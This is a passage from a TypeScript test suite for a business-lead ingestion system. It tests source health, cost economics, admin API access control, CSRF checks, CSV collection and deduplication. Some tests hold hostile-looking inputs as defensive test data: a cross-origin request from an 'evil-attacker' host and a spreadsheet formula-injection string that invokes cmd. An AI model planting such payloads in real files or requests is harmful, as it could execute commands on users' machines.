      const retentionRes = await applyIngestionRetentionPolicy(prisma, {
        adminUserId,
      });
      expect(typeof retentionRes.redactedSourcePayloads).toBe('number');
      expect(typeof retentionRes.deletedDeadLetters).toBe('number');
    });
  });

  describe('5. Source Health, Continuous Supply Replenishment & Phase 7 Analytics Economics Integration', () => {
    it('calculates deterministic source health statuses and evaluates scheduled sources', async () => {
      expect(
        determineDeterministicHealthStatus({
          enabled: false,
          isActive: false,
          configurationStatus: 'CONFIGURED',
          circuitState: 'CLOSED',
          consecutiveFailures: 0,
          invalidRate: 0,
          duplicateRate: 0,
          totalProcessed: 10,
        })
      ).toBe('DISABLED');

      expect(
        determineDeterministicHealthStatus({
          enabled: true,
          isActive: true,
          configurationStatus: 'NOT_CONFIGURED',
          circuitState: 'CLOSED',
          consecutiveFailures: 0,
          invalidRate: 0,
          duplicateRate: 0,
          totalProcessed: 0,
        })
      ).toBe('NOT_CONFIGURED');

      expect(
        determineDeterministicHealthStatus({
          enabled: true,
          isActive: true,
          configurationStatus: 'CONFIGURED',
          circuitState: 'OPEN',
          consecutiveFailures: 3,
          invalidRate: 0,
          duplicateRate: 0,
          totalProcessed: 10,
        })
      ).toBe('FAILING');

      expect(
        determineDeterministicHealthStatus({
          enabled: true,
          isActive: true,
          configurationStatus: 'CONFIGURED',
          circuitState: 'CLOSED',
          consecutiveFailures: 0,
          invalidRate: 0.45,
          duplicateRate: 0.1,
          totalProcessed: 20,
        })
      ).toBe('DEGRADED');

      const baseDate = new Date('2026-10-08T12:00:00.000Z');
      expect(
        computeNextRunAt({ baseTime: baseDate, scheduleIntervalMinutes: 60 })?.toISOString()
      ).toBe('2026-10-08T13:00:00.000Z');
      expect(
        computeNextRunAt({ baseTime: baseDate, scheduleIntervalMinutes: 1440 })?.toISOString()
      ).toBe('2026-10-09T12:00:00.000Z');

      const scheduled = await evaluateScheduledSources(prisma, {
        userId: adminUserId,
        autoExecute: false,
      });
      expect(typeof scheduled.dueSourcesCount).toBe('number');
      expect(Array.isArray(scheduled.dueSources)).toBe(true);
    });

    it('evaluates inventory replenishment plans and operational alerts deterministically', async () => {
      const replenishment = await evaluateInventoryReplenishment(prisma, {
        rules: DEFAULT_INVENTORY_TARGETS,
        autoTrigger: false,
      });
      expect(replenishment.evaluatedAt).toBeTruthy();
      expect(replenishment.decisions.length).toBe(DEFAULT_INVENTORY_TARGETS.length);
      expect(typeof replenishment.decisions[0].needsReplenishment).toBe('boolean');

      const alerts = await evaluateOperationalAlerts(prisma);
      expect(Array.isArray(alerts)).toBe(true);

      const overview = await getIngestionHealthOverview(prisma);
      expect(overview.summary.totalSources).toBeGreaterThanOrEqual(1);
      expect(overview.registeredCollectors.length).toBeGreaterThanOrEqual(6);
    });

    it('integrates source ingestion funnel and cost economics with Phase 7 getSourceAnalytics', async () => {
      // Unit test computeSourceCostEconomics with configured vs unconfigured cost
      const noCostEcon = computeSourceCostEconomics({
        acquisitionCostPerRunEgp: null,
        acquisitionCostPerRecordEgp: null,
        completedRunsCount: 2,
        collectedRecordsCount: 100,
        uniqueLeadsCount: 50,
        saleableLeadsCount: 40,
        claimedLeadsCount: 10,
        wonLeadsCount: 2,
      });
      expect(noCostEcon.hasCostData).toBe(false);
      expect(noCostEcon.costPerSaleableLead.status).toBe('INSUFFICIENT_DATA');
      expect(noCostEcon.costPerSaleableLead.value).toBeNull();

      const configuredCostEcon = computeSourceCostEconomics({
        acquisitionCostPerRunEgp: 100,
        acquisitionCostPerRecordEgp: 1,
        completedRunsCount: 2,
        collectedRecordsCount: 100, // Total cost = 2*100 + 100*1 = 300 EGP
        uniqueLeadsCount: 60,
        saleableLeadsCount: 30,
        claimedLeadsCount: 10,
        wonLeadsCount: 3,
      });
      expect(configuredCostEcon.hasCostData).toBe(true);
      expect(configuredCostEcon.totalAcquisitionCostEgp).toBe(300);
      expect(configuredCostEcon.costPerCollectedRecord.value).toBe(3);
      expect(configuredCostEcon.costPerSaleableLead.value).toBe(10);
      expect(configuredCostEcon.costPerClaimedLead.value).toBe(30);
      expect(configuredCostEcon.costPerWonLead.value).toBe(100);

      // Verify Phase 7 getSourceAnalytics returns collectorVersion, healthStatus, ingestionFunnel, and costEconomics
      const sourceAnalytics = await getSourceAnalytics({});
      expect(sourceAnalytics.sources.length).toBeGreaterThanOrEqual(1);
      const sampleRow = sourceAnalytics.sources[0];
      expect(sampleRow).toHaveProperty('collectorVersion');
      expect(sampleRow).toHaveProperty('healthStatus');
      expect(sampleRow).toHaveProperty('ingestionFunnel');
      expect(sampleRow).toHaveProperty('costEconomics');
    });
  });

  describe('6. Admin Ingestion APIs, RBAC & CSRF Protection', () => {
    it('blocks unauthenticated and DEVELOPER requests to all /api/admin/ingestion/* endpoints', async () => {
      const unauthReq = makeAuthRequest(
        'http://localhost:3000/api/admin/ingestion/sources',
        'GET'
      );
      const unauthRes = await getIngestionSourcesRoute(unauthReq);
      expect(unauthRes.status).toBe(401);

      const devReq = makeAuthRequest(
        'http://localhost:3000/api/admin/ingestion/sources',
        'GET',
        developerToken
      );
      const devRes = await getIngestionSourcesRoute(devReq);
      expect(devRes.status).toBe(403);

      // Cross-origin POST request with valid admin token must be blocked by CSRF check
      const csrfReq = makeAuthRequest(
        'http://localhost:3000/api/admin/ingestion/sources',
        'POST',
        adminToken,
        { name: 'CSRF Evil Source', type: 'DIRECTORY' },
        'https://evil-attacker.example.com'
      );
      const csrfRes = await postIngestionSourcesRoute(csrfReq);
      expect(csrfRes.status).toBe(403);
    });

    it('allows ADMIN to manage sources, trigger runs, inspect jobs, manage DLQ, and query health via API', async () => {
      // 1. GET /api/admin/ingestion/sources (ensures secrets are masked)
      const listSourcesReq = makeAuthRequest(
        'http://localhost:3000/api/admin/ingestion/sources',
        'GET',
        adminToken
      );
      const listSourcesRes = await getIngestionSourcesRoute(listSourcesReq);
      expect(listSourcesRes.status).toBe(200);
      const listSourcesData = await listSourcesRes.json();
      expect(listSourcesData.sources.length).toBeGreaterThanOrEqual(1);
      expect(listSourcesData.registeredCollectors.length).toBeGreaterThanOrEqual(6);

      // 2. POST /api/admin/ingestion/sources
      const uniqueApiSourceName = `API Created OpenData Source ${Date.now()}`;
      const createSourceReq = makeAuthRequest(
        'http://localhost:3000/api/admin/ingestion/sources',
        'POST',
        adminToken,
        {
          name: uniqueApiSourceName,
          type: 'OPEN_DATA',
          scheduleIntervalMinutes: 360,
          requestsPerMinute: 120,
          acquisitionCostPerRunEgp: 25,
          config: {
            apiKey: 'super-secret-token-not-returned',
          },
        }
      );
      const createSourceRes = await postIngestionSourcesRoute(createSourceReq);
      expect(createSourceRes.status).toBe(201);
      const createdSourcePayload = await createSourceRes.json();
      const apiSourceId = createdSourcePayload.source.id as string;
      expect(createdSourcePayload.source.safeConfig.apiKey).toBe('[REDACTED]');

      // 3. GET & PATCH /api/admin/ingestion/sources/[sourceId]
      const detailReq = makeAuthRequest(
        `http://localhost:3000/api/admin/ingestion/sources/${apiSourceId}`,
        'GET',
        adminToken
      );
      const detailRes = await getIngestionSourceDetailRoute(detailReq, {
        params: Promise.resolve({ sourceId: apiSourceId }),
      });
      expect(detailRes.status).toBe(200);

      const patchReq = makeAuthRequest(
        `http://localhost:3000/api/admin/ingestion/sources/${apiSourceId}`,
        'PATCH',
        adminToken,
        { priority: 90, maxRecordsPerRun: 250 }
      );
      const patchRes = await patchIngestionSourceDetailRoute(patchReq, {
        params: Promise.resolve({ sourceId: apiSourceId }),
      });
      expect(patchRes.status).toBe(200);

      // 4. POST /api/admin/ingestion/sources/[sourceId]/run
      const runReq = makeAuthRequest(
        `http://localhost:3000/api/admin/ingestion/sources/${apiSourceId}/run`,
        'POST',
        adminToken,
        {
          rawRecords: [
            {
              externalId: 'API-OD-900',
              businessName: 'مستشفى الشروق التخصصي',
              phone: '01044332211',
              city: 'القاهرة',
              category: 'Medical',
            },
          ],
        }
      );
      const runRes = await postRunIngestionSourceRoute(runReq, {
        params: Promise.resolve({ sourceId: apiSourceId }),
      });
      expect(runRes.status).toBe(200);
      const runData = await runRes.json();
      expect(runData.report.status).toBe('COMPLETED');
      const createdJobId = runData.report.importJobId as string;

      // 5. GET /api/admin/ingestion/jobs & GET /api/admin/ingestion/jobs/[jobId]
      const jobsReq = makeAuthRequest(
        'http://localhost:3000/api/admin/ingestion/jobs',
        'GET',
        adminToken
      );
      const jobsRes = await getIngestionJobsRoute(jobsReq);
      expect(jobsRes.status).toBe(200);

      const jobDetailReq = makeAuthRequest(
        `http://localhost:3000/api/admin/ingestion/jobs/${createdJobId}`,
        'GET',
        adminToken
      );
      const jobDetailRes = await getIngestionJobDetailRoute(jobDetailReq, {
        params: Promise.resolve({ jobId: createdJobId }),
      });
      expect(jobDetailRes.status).toBe(200);

      // 6. GET /api/admin/ingestion/dead-letter
      const dlqReq = makeAuthRequest(
        'http://localhost:3000/api/admin/ingestion/dead-letter',
        'GET',
        adminToken
      );
      const dlqRes = await getDeadLetterRoute(dlqReq);
      expect(dlqRes.status).toBe(200);
      const dlqData = await dlqRes.json();
      expect(dlqData).toHaveProperty('items');
      expect(dlqData).toHaveProperty('pagination');

      // 7. GET & POST /api/admin/ingestion/health
      const healthReq = makeAuthRequest(
        'http://localhost:3000/api/admin/ingestion/health',
        'GET',
        adminToken
      );
      const healthRes = await getIngestionHealthRoute(healthReq);
      expect(healthRes.status).toBe(200);

      const healthActionReq = makeAuthRequest(
        'http://localhost:3000/api/admin/ingestion/health',
        'POST',
        adminToken,
        { action: 'EVALUATE_REPLENISHMENT', autoTrigger: false }
      );
      const healthActionRes = await postIngestionHealthRoute(healthActionReq);
      expect(healthActionRes.status).toBe(200);
    });
  });

  describe('7. Scale & Performance Benchmarks (1,000+ Pipeline Batch & 10,000 Contract Checksums)', () => {
    it('normalizes, validates, and computes SHA-256 content checksums for 10,000 synthetic records in under 5 seconds', () => {
      const startMs = Date.now();
      const checksums = new Set<string>();

      for (let i = 0; i < 10000; i++) {
        const record = {
          externalId: `bench-${i}`,
          businessName: `شركة الاختبار القياسي رقم ${i}`,
          phone: `010${String(10000000 + i).slice(0, 8)}`,
          city: i % 2 === 0 ? 'القاهرة' : 'الجيزة',
          category: i % 3 === 0 ? 'Medical' : 'Real Estate',
          sourceType: 'DIRECTORY',
        };
        checksums.add(calculateIngestionChecksum(record));
      }

      const elapsedMs = Date.now() - startMs;
      expect(checksums.size).toBe(10000);
      expect(elapsedMs).toBeLessThan(5000);
    });

    it('processes a 1,000-record CsvCollector batch with mixed duplicates and formula injection payloads cleanly', async () => {
      const csvLines = ['businessName,phone,city,category,website'];
      for (let i = 0; i < 1000; i++) {
        const canonicalIdx = i % 200;
        const phone = `011${String(20000000 + canonicalIdx).slice(0, 8)}`;
        const name =
          i % 50 === 0
            ? `=cmd|'calc'!Biz_${canonicalIdx}`
            : `مؤسسة النهضة المصرية ${canonicalIdx}`;
        csvLines.push(
          `${name},${phone},القاهرة,Medical,https://nahda-${canonicalIdx}.example.eg`
        );
      }

      const csvCollector = new CsvCollector();
      const collectedRecords = await csvCollector.collect(csvLines.join('\n'));

      expect(collectedRecords).toHaveLength(1000);
      // Verify formula injection rows were neutralized (leading '=' stripped)
      expect(collectedRecords[0].businessName?.startsWith('=')).toBe(false);
      expect(collectedRecords[0].businessName).toContain("cmd|'calc'!Biz_0");
    });

    it('guarantees checksum parity between RawLeadInput and NormalizedLeadData and supports WebsiteCollector targetUrls HTTP inspection', async () => {
      const sampleRaw = {
        externalId: 'PARITY-001',
        businessName: 'عيادة النيل التخصصية للأسنان',
        phone: '01012345678',
        phones: ['01012345678', '01198765432'],
        website: 'https://facebook.com/niledental.cairo',
        city: 'القاهرة',
        category: 'Dental',
        sourceType: 'DIRECTORY',
      };

      const validation = validateAndNormalizeLead(sampleRaw);
      expect(validation.valid).toBe(true);
      const rawHash = calculateIngestionChecksum(sampleRaw);
      const normalizedHash = calculateIngestionChecksum(validation.data!);
      expect(rawHash).toBe(normalizedHash);

      // Verify WebsiteCollector targetUrls discovery & mocked HTTP HTML inspection
      const webCollector = new WebsiteCollector();
      const mockFetch = async () =>
        new Response(
          `<html><head><title>عيادة النيل التخصصية للأسنان</title></head><body>اتصل بنا: 01012345678 أو راسلنا على <a href="mailto:info@niledental-eg.com">info@niledental-eg.com</a> <a href="https://facebook.com/niledental.eg">FB</a></body></html>`,
          {
            status: 200,
            headers: { 'content-type': 'text/html; charset=utf-8' },
          }
        );

      const execCtx = {
        sourceName: 'Public Domain & Website Registry',
        config: {
          targetUrls: ['https://niledental-eg.com'],
          defaultCity: 'القاهرة',
          defaultCategory: 'Dental',
          fetchImpl: mockFetch,
        },
      };

      const discovered = await webCollector.discover(execCtx);
      expect(discovered.items).toHaveLength(1);
      expect(discovered.items[0].externalId).toBe('web-target-1');

      const fetched = await webCollector.fetch(execCtx, discovered.items);
      expect(fetched.records).toHaveLength(1);

      const contractRec = webCollector.normalize(fetched.records[0], execCtx);
      expect(contractRec.leadInput.businessName).toContain('عيادة النيل التخصصية للأسنان');
      expect(contractRec.leadInput.phone).toBe('01012345678');
      expect(contractRec.leadInput.email).toBe('info@niledental-eg.com');
      expect(contractRec.leadInput.facebook).toContain('facebook.com/niledental.eg');
    });

    it('prevents duplicate concurrent jobs on the same source (JOB_LOCKED) and safely merges simultaneous multi-collector discoveries of the same business', async () => {
      // 1. Verify per-source job locking blocks a concurrent MANUAL run on the same source
      const lockSource = await prisma.leadSource.create({
        data: {
          name: `Locked Source ${Date.now()}`,
          type: 'DIRECTORY',
          isActive: true,
          enabled: true,
          collectorKey: 'directory',
          collectorVersion: 'directory-v1',
        },
      });

      const lockKey = `source:${lockSource.id}`;
      expect(acquireSourceJobLock(lockKey, 'active-job-simulation')).toBe(true);
      try {
        await expect(
          runIngestionPipeline({
            prisma,
            userId: adminUserId,
            sourceId: lockSource.id,
            sourceName: lockSource.name,
            sourceType: 'DIRECTORY',
            triggerType: 'MANUAL',
            rawRecords: [
              {
                externalId: 'LOCK-TEST-1',
                businessName: 'شركة اختبار القفل المتزامن',
                phone: '01099881122',
                city: 'القاهرة',
                category: 'Medical',
              },
            ],
          })
        ).rejects.toMatchObject({
          code: 'JOB_LOCKED',
          statusCode: 409,
        });
      } finally {
        releaseSourceJobLock(lockKey, 'active-job-simulation');
      }

      // 2. Simulate Collector A (OPEN_DATA) + Collector B (DIRECTORY) discovering the exact same business simultaneously (Section 70)
      const randPhoneSuffix = String(10000000 + Math.floor(Math.random() * 89999999));
      const sharedPhone = `015${randPhoneSuffix}`;
      const normalizedSharedPhone = `2015${randPhoneSuffix}`;

      const [sourceA, sourceB] = await Promise.all([
        prisma.leadSource.create({
          data: {
            name: `Concurrent Collector A ${Date.now()}-${randPhoneSuffix}`,
            type: 'OPEN_DATA',
            isActive: true,
            enabled: true,
            collectorKey: 'open-data',
            collectorVersion: 'open-data-v1',
          },
        }),
        prisma.leadSource.create({
          data: {
            name: `Concurrent Collector B ${Date.now()}-${randPhoneSuffix}`,
            type: 'DIRECTORY',
            isActive: true,
            enabled: true,
            collectorKey: 'directory',
            collectorVersion: 'directory-v1',
          },
        }),
      ]);

      const [reportA, reportB] = await Promise.all([
        runIngestionPipeline({
          prisma,
          userId: adminUserId,
          sourceId: sourceA.id,
          sourceName: sourceA.name,
          sourceType: 'OPEN_DATA',
          triggerType: 'SCHEDULED',
          rawRecords: [
            {
              externalId: `CONC-A-${randPhoneSuffix}`,
              businessName: `مركز التميز الطبي المتزامن ${randPhoneSuffix}`,
              phone: sharedPhone,
              email: `contact-${randPhoneSuffix}@tamayoz-med.eg`,
              city: 'القاهرة',
              category: 'Medical',
            },
          ],
        }),
        runIngestionPipeline({
          prisma,
          userId: adminUserId,
          sourceId: sourceB.id,
          sourceName: sourceB.name,
          sourceType: 'DIRECTORY',
          triggerType: 'SCHEDULED',
          rawRecords: [
            {
              externalId: `CONC-B-${randPhoneSuffix}`,
              businessName: `مركز التميز الطبي المتزامن ${randPhoneSuffix}`,
              phone: sharedPhone,
              website: `https://tamayoz-${randPhoneSuffix}.eg`,
              facebook: `https://facebook.com/tamayoz.${randPhoneSuffix}`,
              city: 'القاهرة',
              category: 'Medical',
            },
          ],
        }),
      ]);

      expect(reportA.status).toBe('COMPLETED');
      expect(reportB.status).toBe('COMPLETED');

      // Exactly 1 canonical Lead must exist for this phone number, enriched by both collectors
      const matchingLeads = await prisma.lead.findMany({
        where: { normalizedPhone: normalizedSharedPhone, isCanonical: true },
        include: { sourceRecords: true },
      });
      expect(matchingLeads).toHaveLength(1);
      const canonicalLead = matchingLeads[0];
      expect(canonicalLead.sourceRecords).toHaveLength(2);
      expect(canonicalLead.normalizedEmail).toBe(`contact-${randPhoneSuffix}@tamayoz-med.eg`);
      expect(canonicalLead.normalizedDomain).toBe(`tamayoz-${randPhoneSuffix}.eg`);

      // Also verify Dead-Letter status filter API works for both canonical and shorthand status values
      const resolvedDlqReq = makeAuthRequest(
        'http://localhost:3000/api/admin/ingestion/dead-letter?status=RETRIED_RESOLVED',
        'GET',
        adminToken
      );
      const resolvedDlqRes = await getDeadLetterRoute(resolvedDlqReq);
      expect(resolvedDlqRes.status).toBe(200);
      const resolvedDlqData = await resolvedDlqRes.json();
      expect(resolvedDlqData.items.length).toBeGreaterThanOrEqual(1);
      expect(
        resolvedDlqData.items.every(
          (item: { status: string }) => item.status === 'RETRIED_RESOLVED'
        )
      ).toBe(true);
    });
  });
});

